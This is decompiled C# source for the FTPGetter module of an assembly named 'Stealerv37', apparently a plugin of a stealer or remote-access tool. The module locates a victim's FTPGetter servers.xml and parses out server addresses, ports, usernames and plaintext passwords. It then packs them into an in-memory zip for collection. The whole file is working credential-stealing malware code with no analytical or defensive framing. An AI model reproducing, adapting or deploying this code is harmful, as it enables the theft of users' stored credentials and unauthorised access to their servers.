// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.FTPGetter
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Applications;

public class FTPGetter : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\FTPGetter\\servers.xml";
    if (!File.Exists(path))
      return;
    string str1 = File.ReadAllText(path, Encoding.UTF8);
    Regex regex1 = new Regex("<server\\b[^>]*>(.*?)</server>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    Regex regex2 = new Regex("<server_ip>\\s*(?<v>.*?)\\s*</server_ip>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    Regex regex3 = new Regex("<server_port>\\s*(?<v>\\d+)\\s*</server_port>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    Regex regex4 = new Regex("<server_user_name>\\s*(?<v>.*?)\\s*</server_user_name>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    Regex regex5 = new Regex("<server_user_password>\\s*(?<v>.*?)\\s*</server_user_password>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    List<string> values = new List<string>();
    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
    {
      Name = nameof (FTPGetter)
    };
    string input1 = str1;
    foreach (Match match1 in regex1.Matches(input1))
    {
      string input2 = match1.Groups[1].Value;
      Match match2 = regex2.Match(input2);
      if (match2.Success)
      {
        string str2 = match2.Groups["v"].Value.Trim();
        Match match3 = regex3.Match(input2);
        string str3 = match3.Success ? match3.Groups["v"].Value.Trim() : "21";
        Match match4 = regex4.Match(input2);
        string str4 = match4.Success ? match4.Groups["v"].Value.Trim() : "";
        Match match5 = regex5.Match(input2);
        string str5 = match5.Success ? match5.Groups["v"].Value.Trim() : "";
        values.Add($"Url: {str2}:{(string.IsNullOrEmpty(str3) ? "21" : str3)}\nUsername: {str4}\nPassword: {str5}\n");
        counterApplications.Files.Add(path + " => FTPGetter\\Hosts.txt");
      }
    }
    if (values.Count <= 0)
      return;
    zip.AddFile("FTPGetter\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", (IEnumerable<string>) values)));
    counterApplications.Files.Add("FTPGetter\\Hosts.txt");
    counter.Applications.Add(counterApplications);
  }
}
